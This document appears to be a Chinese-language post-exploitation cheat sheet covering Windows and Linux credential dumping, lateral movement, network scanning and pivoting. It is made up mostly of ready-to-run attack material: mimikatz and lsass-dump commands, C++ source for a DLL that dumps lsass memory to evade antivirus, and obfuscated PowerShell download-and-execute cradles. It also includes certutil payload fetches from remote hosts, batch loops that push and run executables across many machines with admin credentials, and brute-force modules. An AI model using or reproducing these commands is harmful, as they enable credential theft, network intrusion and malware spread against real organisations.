>for /f %i in (ip.txt) do net use \\%i\admin$ /user:"administrator" "password" & if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) & schtasks /create /s "%i" /u "administrator" /p "password" /RL HIGHEST /F /tn "windowsupdate" /tr "c:\windows\temp\getpass.exe" /sc DAILY /mo 1 /ST 00:00 /RU SYSTEM & schtasks /run /tn windowsupdate /s "%i" /U "administrator" /P "password" & schtasks /delete /F /tn windowsupdate /s "%i" /U " administrator" /P "password" & @ping 127.0.0.1 -n 10 >nul & move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs & del \\%i\admin$\debug\getpass.exe /F & net use \\%i\admin$ /del
```

##### WMIC  wmic_2)

```
>for /f %i in (ip.txt) do net use \\%i\admin$ /user:"administrator" "password" & if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) & wmic /NODE:"%i" /user:"administrator" /password:"password" PROCESS call create "c:\windows\temp\getpass.exe" & @ping 127.0.0.1 -n 10 >nul & move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs & del \\%i\admin$\temp\getpass.exe /F & net use \\%i\admin$ /del
```

#### 直接使用  _76)

```
>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt 
>privilege::debug
>misc::memssp
锁屏
>rundll32.exe user32.dll,LockWorkStation
记录的结果在c:\windows\system32\mimilsa.log
>mimikatz log "privilege::debug" "lsadump::lsa /patch"
>mimikatz !privilege::debug 
>mimikatz !token::elevate 
>mimikatz !lsadump::sam
```

#### Powershell Bypass  powershell-bypass)

```
>powershell -c " ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.0'+'.101/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"
```

#### .net 2.0  net-20)

```
katz.cs放置C:\Windows\Microsoft.NET\Framework\v2.0.50727
Powershell执行
>$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
>$Content = [System.Convert]::FromBase64String($key)
>Set-Content key.snk -Value $Content –Encoding Byte
Cmd执行
>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs
>C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe
```

#### .net 4.0 Msbuild  net-40-msbuild)

```
>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild mimi.xml
```

#### JScript  jscript)

```
>wmic os get /format:"mimikatz.xsl"
```

![image](http://159.75.51.84:8000/img/314.png)

```
>wmic os get /format:"http://192.168.0.107/ps/mimi.xsl"
```

#### Procdump64+mimikatz  procdump64mimikatz)

```
>procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
>procdump.exe -accepteula -ma lsass.exe lsass.dmp
>mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'"
```

#### Dumpert  dumpert)

```
https://github.com/outflanknl/Dumpert
有三种，分别是dll，可执行文件和cs的Aggressor插件，这里测试下dll和exe
DLL的执行方式是
rundll32.exe C:\Outflank-Dumpert.dll,Dump
```

![image](http://159.75.51.84:8000/img/653.png)

```
文件保存在c:\windows\temp\dumpert.dmp
用mimikatz
>sekurlsa::mimidump c:\windows\temp\dumpert.dmp
>sekurlsa::logonpasswords
```

![image](http://159.75.51.84:8000/img/654.png)

```
可执行文件就直接执行就可以了
```

![image](http://159.75.51.84:8000/img/655.png) ![image](http://159.75.51.84:8000/img/656.png) ![image](http://159.75.51.84:8000/img/657.png)

#### Cisco Jabber转储lsass  cisco-jabberlsass)

```
cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
```

#### 绕过卡巴斯基  _77)

```
https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e
```

![image](http://159.75.51.84:8000/img/315.png)

```
将三个文件下载到本地，使用visual studio进行编译，需要修改了几个地方。
（1）添加如下代码
#pragma comment(lib, "Rpcrt4.lib") （引入Rpcrt4.lib库文件）
（2）将.c文件后缀改成.cpp （使用了c++代码，需要更改后缀）
（3) 编译时选择x64
编译得到exe文件
Visual studio创建c++空项目
配置类型选dll
字符集选Unicode，调试器选64位
Dll保存在C:\\windows\\temp\\1.bin
#include <cstdio>
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>  
#include <map>  
#include <TlHelp32.h> 

#pragma comment(lib,"Dbghelp.lib")
using namespace std;

int FindPID()
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        cout << "CreateToolhelp32Snapshot Error!" << endl;;
        return false;
    }

    BOOL bResult = Process32First(hProcessSnap, &pe32);

    while (bResult)
    {
        if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
        {
            return pe32.th32ProcessID;
        }
        bResult = Process32Next(hProcessSnap, &pe32);
    }

    CloseHandle(hProcessSnap);

    return -1;
}

typedef HRESULT(WINAPI* _MiniDumpW)(
    DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable,
    BOOL CurrentThread, PULONG Enabled);

int dump() {

    HRESULT             hr;
    _MiniDumpW          MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG               t;

    MiniDumpW = (_MiniDumpW)GetProcAddress(
        LoadLibrary(L"comsvcs.dll"), "MiniDumpW");

    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL) {

        return 0;
    }
    // try enable debug privilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);

    wchar_t  ws[100];
    swprintf(ws, 100, L"%hd%hs", FindPID(), " C:\\windows\\temp\\1.bin full");

    MiniDumpW(0, 0, ws);
    return 0;

}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        dump();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
>xxx.exe c:\xx\xx\xx.dll使用绝对路径
```

#### 远程LSASS进程转储-Physmem2profit  lsass-physmem2profit)

```
https://github.com/FSecureLABS/physmem2profit
mimikatz被多数安全人员用来获取凭据，但现在的AV/EDR很轻易的识别并查杀，这里不在服务器端使用mimikatz，远程对lsass进程进行转储。
服务器端直接使用visual studio构建
physmem2profit-public\server\
```

![image](http://159.75.51.84:8000/img/691.png)

```
客户端
>git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
客户端这里先安装
>bash physmem2profit/client/install.sh
```

![image](http://159.75.51.84:8000/img/692.png)

```
需要将此文件
https://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys
传到目标服务器，我这里存放在c:\windows\temp\中
服务器端执行
>Physmem2profit.exe --ip 192.168.0.98 --port 8888 –verbose这里的IP是服务器端IP
```

![image](http://159.75.51.84:8000/img/693.png)

```
攻击端安装所需模块
```

![image](http://159.75.51.84:8000/img/694.png)

```
攻击端执行
>source physmem2profit/client/.env/bin/activate
>cd physmem2profit/client
>python3 physmem2profit --mode all --host 192.168.0.98 --port 8888 --drive winpmem --install 'c:\windows\temp\att_winpmem_64.sys' --label test
```

![image](http://159.75.51.84:8000/img/695.png)

```
服务器端可以看到
```

![image](http://159.75.51.84:8000/img/696.png)

```
把生成的dmp文件转移到win系统上使用mimikatz即可获得hash，当然也可以在linux上使用pypykatz。
```

![image](http://159.75.51.84:8000/img/697.png) ![image](http://159.75.51.84:8000/img/698.png)

```
再来一条转储lsass进程的命令
要以system权限执行
>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

![image](http://159.75.51.84:8000/img/699.png)

#### SqlDumper+mimikatz  sqldumpermimikatz)

```
位置C:\Program Files\Microsoft SQL Server\number\Shared
>tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号
>Sqldumper.exe ProcessID PID 0x01100  导出mdmp文件
>mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit
```

#### Mimipenguin  mimipenguin)

```
抓取linux下hash，root权限
https://github.com/huntergregal/mimipenguin
```

### 缓存hash提取  hash_3)

#### 注册表  _78)

```
>reg save hklm\sam c:\sam.hive &reg save hklm\system c:\system.hive &reg save hklm\security c:\security.hive
>mimikatz.exe "lsadump::sam /system:sys.hive /sam:sam.hive" exit
```

#### Ninjacopy  ninjacopy)

```
#http://192.168.0.101/powersploit/Exfiltration/Invoke-NinjaCopy.ps1
>powershell -exec bypass
>Import-Module .\invoke-ninjacopy.ps1
>Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
>Invoke-NinjaCopy –Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
>Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "C:\Windows\Temp\1.dit"
>Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -ComputerName "dc.zone.com" -LocalDestination "C:\Windows\Temp\1.dit"
```

![image](http://159.75.51.84:8000/img/316.png)

#### Quarks-pwdump  quarks-pwdump)

```
>quarks-pwdump.exe –dump-hash-domain
```

### 域hash提取  hash_4)

#### Ntdsutil  ntdsutil)

```
>ntdsutil
>snapshot
>activate instance ntds
>create
>mount {guid}
>copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit
>unmount {guid}
>delete {guid}
>quit
&
创建
> ntdsutil snapshot “activate instance ntds” create quit quit
挂载
> ntdsutil snapshot “mount {guid}” quit quit
复制
>copy c:\$SNAP_XXX_VOLUMEC$\windows\NTDS\ntds.dit d:\ntds_save.dit
卸载并删除
> ntdsutil snapshot “unmounts {guid}” “delete {guid}” quit quit
删除后检测
> ntdsutil snapshot “List All” quit quit
提取hash
> QuarksPwDump -dump-hash-domain -ntds-file d:\ntds_save.dit
```

#### Vssadmin  vssadmin)

```
创建C盘卷影拷贝
>vssadmin create shadow /for=c:
复制ntds.dit
>copy {Shadow Copy Volume Name}\windows\NTDS\ntds.dit c:\ntds.dit
删除拷贝
>vssadmin delete shadows /for=c: /quiet
```

#### Impacket  impacket_1)

```
Impacket中的secretsdump.py
#impacket-secretsdump –system SYSTEM –ntds.dit LOCAL
或
#impacket-secretsdump –hashs xxx:xxx –just-dc xxx.com/admin\@192.168.1.1
```

#### NTDSDumpex  ntdsdumpex)

```
>Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "C:\Windows\Temp\1.dit"
>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
https://github.com/zcgonvh/NTDSDumpEx
>NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
```

#### WMI调用Vssadmin  wmivssadmin)

```
>wmic /node:dc /user:xxxx\admin /password:passwd process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
>wmic /node:dc /user:P xxxx\admin /password: passwd process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
>wmic /node:dc /user: xxxx\admin /password: passwd process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
>copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp
```

#### PowerSploit  powersploit)

```
PS >Import-Module .\VolumeShadowCopyTools.ps1
PS >New-VolumeShadowCopy -Volume C:\
PS >Get-VolumeShadowCopy
```

#### Nishang  nishang_1)

```
PS >Import-Module .\Copy-VSS.ps1
PS >Copy-VSS
PS >Copy-VSS -DestinationDir C:\ShadowCopy\
或MSF中
Meterpreter>load powershell
Meterpreter>powershell_import /root/Copy-VSS.ps1
Meterpreter>powershell_execute Copy-VSS
```

#### Mimikatz  mimikatz_2)

```
#lsadump::dcsync /domain:xxx.com /all /csv
或
#privilege::debug
#lsadump::lsa /inject
```

#### MSF  msf_9)

```
#use auxiliary/admin/smb/psexec_ntdsgrab
#set rhost smbdomain smbuser smbpass
#exploit
Ntds.dit文件存在/root/.msf4/loot
后渗透模块
#use windows/gather/credentials/domain_hashdump
#set session 1
```

### laZagne  lazagne)

#### windows  windows_3)

```
https://github.com/AlessandroZ/LaZagne
>laZagne.exe all -oN获取所有密码输出到文件
Powershell
PS>[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
PS>$vault = New-Object Windows.Security.Credentials.PasswordVault
PS>$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
```

#### Linux  linux_6)

```
>python3 laZagne.py all
```

### 敏感信息  _79)

#### Seatbelt  seatbelt)

```
使用Visual studio编译
>Seatbelt.exe ALL获取所有信息
```

#### VNC密码  vnc)

```
>reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v password
http://www.cqure.net/wp/tools/password-recovery/vncpwdump/
解密
>vncpwdump.exe -k hash
```

#### Navicat信息  navicat)

```
>reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host 
>reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName 
>reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd
离线破解
https://github.com/HyperSine/how-does-navicat-encrypt-password
```

#### Chrome保存的密码  chrome)

```
>mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

#### Foxmail  foxmail)

```
X:\Foxmail\storage\xxx\Accounts\Account.rec0
使用
Foxmail Password Decryptor解密
https://securityxploded.com/foxmail-password-decryptor.php
```

#### firefox保存的密码  firefox)

```
https://www.nirsoft.net/password_recovery_tools.html
>webbrowserpassview.exe /LoadPasswordsFirefox 1 /shtml "c:\1.html"
或
>dir %appdata%\Mozilla\Firefox\Profiles\
>dir %appdata%\Mozilla\Firefox\Profiles\yn80ouvt.default
需先结束firefox.exe进程
压缩
>7z.exe -r -padmin123 a c:\users\public\firefox.7z C:\Users\Administrator\AppData\Roaming\Mozilla\*.* 
https://github.com/unode/firefox_decrypt
https://securityxploded.com/firefox-master-password-cracker.php
```

#### SecureCRT  securecrt)

```
C:\Documents and Settings\Administrator\Application Data\VanDyke下的config文件夹
C:\program files\Vandyke software\securecrt\
https://github.com/uknowsec/SharpDecryptPwd
```

## 横向  _80)

### 探测存活主机  _81)

#### For+Ping命令查询存活主机  forping)

```
>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.0.%I |findstr "TTL="
```

![image](http://159.75.51.84:8000/img/317.png)

```
For+Ping命令查询域名对应IP
>for /f "delims=" %i in (D:/domains.txt) do @ping -w 1 -n 1 %i | findstr /c:"[192." >> c:/windows/temp/ds.txt
```

#### 内外网资产对应  _82)

```
1.将收集到的子域名保存，使用ping命令在内网循环
for /f "delims=" %i in (host.txt) do @ping -w 1 -n 1 %i | findstr /c:"[10." /c:"[192." /c:"[172." >> C:/users/public/out.txt
2.找到dns服务器ip，ipconfig或扫描开启53端口的机器
https://github.com/Q2h1Cg/dnsbrute
dnsbrute.exe -domain a.com -dict ziyuming.txt -rate 1000 -retry 1 -server 192.168.1.1:53
3.扫描内网ip开启web服务的title
```

#### NbtScan  nbtscan)

```
Windows
>nbtscan.exe -m 192.168.1.0/24
Linux
#nbtscan -r 192.168.0.0/24
```

#### NMAP  nmap_1)

```
#nmap -Pn -open -A -n -v -iL filename.txt
-Pn：跳过主机发现
-n:不做DNS解析
-open：只显示开启的端口
-A：扫描过程中，输入回车，可以查看扫描进度
-v：显示详细信息
-F：快速扫描100个常见端口
-p:选择要扫描的端口  例： -p1-65535 （全端口扫描，中间没有空格）
-iL：为程序指定一个要扫描的IP列表
-sV：探测开放端口的服务和版本信息
-T可以选择扫描等级，默认T3，但想快点话，可以输入  -T4
存活主机
>nmap -sP -PI 192.168.0.0/24
>nmap -sn -PE -T4 192.168.0.0/24
>nmap -sn -PR 192.168.0.0/24
```

##### 代理NMAP扫描  nmap_2)

```
meterpreter > background
msf > use auxiliary/server/socks4a
再配置proxychains.conf
#proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 内网IP
```

#### NetDiscover  netdiscover)

```
#netdiscover -r 192.168.0.0/24 -i wlan0
```

#### rp-scan  rp-scan)

```
kali
>arp-scan --interface=wlan0 -localnet
Windows
>arp-scan.exe -t 192.168.0.0/24
```

#### MSF  msf_10)

```
#use auxiliary/scanner/discovery/arp_sweep
```

![image](http://159.75.51.84:8000/img/318.png)

```
#use auxiliary/scanner/discovery/udp_sweep
```

![image](http://159.75.51.84:8000/img/319.png)

```
#use auxiliary/scanner/netbios/nbname
meterpreter>run post/windows/gather/arp_scanner RHOSTS=192.168.1.1/24
meterpreter>run post/multi/gather/ping_sweep RHOSTS=192.168.1.1/24
```

### 探测服务&端口  _83)

```
常见端口
```

| 服务       | 端口                            |
| :--------- | :------------------------------ |
| Mssql      | 1433                            |
| SMB        | 445                             |
| WMI        | 135                             |
| winrm      | 5985                            |
| rdp        | 3389                            |
| ssh        | 22                              |
| oracle     | 1521                            |
| mysql      | 3306                            |
| redis      | 6379                            |
| postgresql | 5432                            |
| ldap       | 389                             |
| smtp       | 25                              |
| pop3       | 110                             |
| imap       | 143                             |
| exchange   | 443                             |
| vnc        | 5900                            |
| ftp        | 21                              |
| rsync      | 873                             |
| mongodb    | 27017                           |
| telnet     | 23                              |
| svn        | 3690                            |
| java rmi   | 1099                            |
| couchdb    | 5984                            |
| pcanywhere | 5632                            |
| web        | 80-90,8000-10000,7001,9200,9300 |

#### Powershell  powershell_4)

##### POWERSPLOIT  powersploit_1)

```
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powersploit/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 192.168.0.0/24 –T 4 -Ports '1-65535' -oA C:\TEMP.txt"
```

##### NISHANG  nishang_2)

```
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/nishang/Scan/Invoke-PortScan.ps1'); Invoke-Portscan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort"
```

![image](http://159.75.51.84:8000/img/320.png)

```
去掉scanport就是探测存活
```

#### SMB  smb)

```
https://github.com/ShawnDEvans/smbmap
```

##### MSF  msf_11)

```
#use auxiliary/scanner/smb/smb_version查询开启139，445端口主机
#use auxiliary/scanner/smb/smb_login 爆破
```

##### NMAP  nmap_3)

```
#nmap -sU -sS --script smb-enum-shares.nse -p 445 192.168. 1.119
```

##### CMD  cmd_2)

```
>for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445
```

#### Linux Samba服务  linux-samba)

```
端口一般139，弱口令连接
>smbclient -L 192.168.0.110
>smbclient '\\192.168.0.110\IPC$'
#use exploit/linux/samba/is_known_pipenamea
```

#### MSF  msf_12)

##### 端口  _84)

```
#use auxiliary/scanner/portscan/tcp
#use auxiliary/scanner/portscan/ack
```

##### 服务  _85)

```
#use auxiliary/scanner/ftp/ftp_version 开启FTP的机器
#use auxiliary/scanner/ftp/anonymous 允许匿名登录的FTP
#use auxiliary/scanner/ftp/ftp_login FTP爆破
#use auxiliary/scanner/http/http_version 开启HTTP服务的
#use auxiliary/scanner/smb/smb_version 开启SMB服务的
#use auxiliary/scanner/smb/smb_enumshares 允许匿名登录的SMB
#use auxiliary/scanner/smb/smb_login SMB爆破
#use auxiliary/scanner/ssh/ssh_version 开启SSH的机器
#use auxiliary/scanner/ssh/ssh_login SSH爆破
#use auxiliary/scanner/telnet/telnet_version 开启TELNET服务的
#use auxiliary/scanner/telnet/telnet_login TELNET爆破
#use auxiliary/scanner/mysql/mysql_version 开启MYSQL服务的
#use auxiliary/scanner/mysql/mysql_login MYSQL爆破
#use auxiliary/scanner/mssql/mssql_ping 开启SQLSERVER服务的
#use auxiliary/scanner/mssql/mssql_login MSSQL爆破
#use auxiliary/scanner/postgres/postgres_version开启POSTGRE服务的
#use auxiliary/scanner/postgres/postgres_login POSTGRESQL爆破
#use auxiliary/scanner/oracle/tnslsnr_version 开启oracle数据库的
#use auxiliary/admin/oracle/oracle_login Oracle数据库爆破
#use auxiliary/scanner/http/title 扫描HTTP标题
#use auxiliary/scanner/rdp/rdp_scanner 开启RDP服务的
#use auxiliary/scanner/http/webdav_scanner
#use auxiliary/scanner/http/http_put 开启WEBDAV的
#use auxiliary/scanner/smb/smb_ms17_010 存在17010漏洞的
#use auxiliary/scanner/http/zabbix_login zabbix爆破
#use auxiliary/scanner/http/axis_login axis爆破
#use auxiliary/scanner/redis/redis_login redis爆破
```

#### Nc  nc_2)

```
>nc -znv 192.168.0.98 1-65535
```

![image](http://159.75.51.84:8000/img/321.png)

```
>nc -v -w 1 192.168.0.110 -z 1-1000
>for i in {101..102}; do nc -vv -n -w 1 192.168.0.$i 21-25 -z; done
```

#### Masscan  masscan)

```
$sudo apt-get install clang git gcc make libpcap-dev
$git clone https://github.com/robertdavidgraham/masscan
$cd masscan
$make 
>masscan -p80,3389,1-65535 192.168.0.0/24
```

![image](http://159.75.51.84:8000/img/322.png)

#### PTScan  ptscan)

```
友好识别web服务
https://github.com/phantom0301/PTscan/blob/master/PTscan.py
>python PTscan.py {-f /xxx/xxx.txt or -h 192.168.1} [-p 21,80,3306]  [-m 50] [-t 10] [-n(不ping)] [-b(开启banner扫描)] [-r查找IP]
80,81,82,83,84,85,86,87,88,89,90,91,901,18080,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,443,8443,7001
```

#### CobaltStrike+K8 Aggressor  cobaltstrikek8-aggressor)

```
https://github.com/k8gege/Aggressor
```

##### 存活主机  _86)

```
beacon>Cscan 192.168.0.0/24 OnlinePC
```

![image](http://159.75.51.84:8000/img/323.png)

##### MS17010  ms17010)

```
beacon>Cscan 192.168.0.0/24 MS17010
```

![image](http://159.75.51.84:8000/img/324.png)

##### 操作系统信息  _87)

```
beacon>Cscan 192.168.0.0/24 Osscan
```

![image](http://159.75.51.84:8000/img/325.png)

##### 内网站点BANNER、标题扫描  banner)

```
beacon>Cscan 192.168.0.0/24 WebScan
```

##### FTP爆破  ftp_1)

```
上传账户密码文件user.txt、pass.txt到beacon目录(beacon>pwd)
beacon>Cscan 192.168.0.0/24 FtpScan
```

##### WMI爆破WINDOWS账户密码  wmiwindows)

```
上传账户密码文件user.txt、pass.txt到beacon目录(beacon>pwd)
beacon>Cscan 192.168.0.0/24 WmiScan
```

##### 思科设备扫描  _88)

```
beacon>Cscan 192.168.0.0/24 CiscoScan
```

##### 枚举共享  _89)

```
beacon> EnumShare
```

##### 枚举SQL SERVER数据库  sql-server)

```
beacon> EnumMSSQL
```

### 执行命令&IPC&计划任务  ipc)

```
建立连接
>net use \\192.168.1.2\ipc$ "password" /user:domain\administrator
查看连接
>net use
列文件
>dir \\192.168.1.2\c$
查看系统时间
>net time \\192.168.1.2
上传文件
>copy 1.exe \\192.168.1.2\c$
下载文件
>copy \\192.168.1.2\c$\1.exe 1.exe
批量IPC
@echo off
echo check ip addr config file…
if not exist ip.txt echo ip addr config file ip.txt does not exist! & goto end
echo read and analysis file…
for /F "eol=#" %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p "123456" cmd & start cmd /c PsExec.exe \\%%i -u administrator -p "123456" cmd
:end
exit
```

#### AT  at)

```
>net use \\192.168.1.2\ipc$ "password" /user:domain\administrator
>copy 1.exe \\192.168.1.2\c$
>net time \\192.168.1.2
>at \\192.168.1.2 1:00AM c:\1.exe
>at \\192.168.1.2 1:00AM cmd.exe /c “ipconfig >c:/1.txt”
>type \\192.168.1.2\c$\1.txt
查看计划任务
>at \\192.168.1.2
删除计划任务
>at \\192.168.1.2 计划ID /delete
横向批量上线
>atexec.exe ./administrator:pass@10.1.1.1 "certutil.exe -urlcache -split -f http://youip.com:80/shell.txt c:/windows/debug/SysDug.exe" 
>atexec.exe ./administrator:pass@10.1.1.1 "c:/windows/debug/SysDug.exe" 
>atexec.exe ./administrator:pass@10.1.1.1 "certutil.exe -urlcache -split -f c:/windows/debug/SysDug.exe delete"
```

#### Schtasks  schtasks_1)

```
>net use \\192.168.0.55\ipc$ "password" /user:"domain\administrator"
>schtasks /query /fo LIST /v 查看计划任务
上传文件
>copy ok.exe \\192.168.0.55\c$\windows\temp
远程创建定时任务 
>schtasks /create /s "192.168.0.55" /u "admin" /p "qqq23" /RL HIGHEST /F /tn "windowsupdate" /tr "c:\windows\temp\ok.exe" /sc DAILY /mo 1 /ST 20:28 /RU SYSTEM
查询远程创建的任务
>schtasks /query /s "192.168.0.55" /U "admin" /P "qqq23" | findstr "windowsupdate" 
立即执行远程任务
>schtasks /run /tn windowsupdate /s "192.168.0.55" /U "admin" /P "qqq23" 
删除定时任务 
>schtasks /Delete /tn windowsupdate /F /s "192.168.0.55" /u "admin" /p "qqq23"
删除IPC
>net user name /del /y
横向批量上线
>for /f %i in (ip.txt) do net use \\%i\admin$ /user:"administrator" "password" & if %errorlevel% equ 0 ( copy ok.exe \\%i\admin$\debug\ /Y ) & wmic /NODE:"%i" /user:"administrator" /password:"password" PROCESS call create "c:\windows\debug\ok.exe" & @ping 127.0.0.1 -n 8 >nul & net use \\%i\admin$ /del
```

#### WMIC  wmic_3)

```
>net use \\192.168.0.55\ipc$ "password" /user:"domain\administrator"
>copy ok.exe \\192.168.0.55\c$\windows\temp
>wmic /NODE:" 192.168.0.55" /user:"administrator" /password:"password" PROCESS call create "c:\windows\temp\ok.exe"
>del \\192.168.0.55\c$\windows\temp\ok.exe /F
>net use \\192.168.0.55\c$ /del
```

### 快速定位域管理登过的机器  _90)

```
>psexec –accepteula @ips.txt –u admin –p pass@123 –c 1.bat
#1.bat内容
tasklist /v | find “域管理名字”
@echo off
echo check ip addr config file…
if not exist ip.txt echo ip addr config file ip.txt does not exist! & goto end
echo read and analysis file…
for /F “eol=#” %%i in (ip.txt) do echo %%i &(echo %%i &tasklist /s %%i /u administrator /p pass@123 /v) >>d:\result.txt
:end
exit
```

### MSF添加路由  msf_13)

```
# route add 内网网卡ip 子网掩码 session的id
# route list
&
Meterpreter>run get_local_subnets查看网段信息再添加路由
# run autoroute -s内网网卡ip/24
# run autoroute -p 查看路由表
&
Meterpreter>run post/multi/manage/autoroute
```

### MSF管道监听  msf_14)

```
在已经获得meterpreter的机器上配置管道监听器
meterpreter > pivot add -t pipe -l 已控IP -n bgpipe -a x86 -p windows
生成
>msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=已控IP PIPENAME=bgpipe -f exe -o pipe.exe.
```

### 代理  _91)

#### SSH  ssh_1)

##### 正向代理  _92)

```
SSH动态转发，是建立正向加密的socks通道
出网靶机编辑后restart ssh服务
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
外部攻击机执行
>ssh -C -f -N -g -D 0.0.0.0:12138 root@出网靶机IP -p 22
MSF中设置全局代理或使用其他软件
>setg proxies socks5:0.0.0.0:12138
即可进行攻击隔离区机器
```

![image](http://159.75.51.84:8000/img/326.png) ![image](http://159.75.51.84:8000/img/327.png)

##### 反向代理  _93)

```
#vim /etc/ssh/sshd_conf
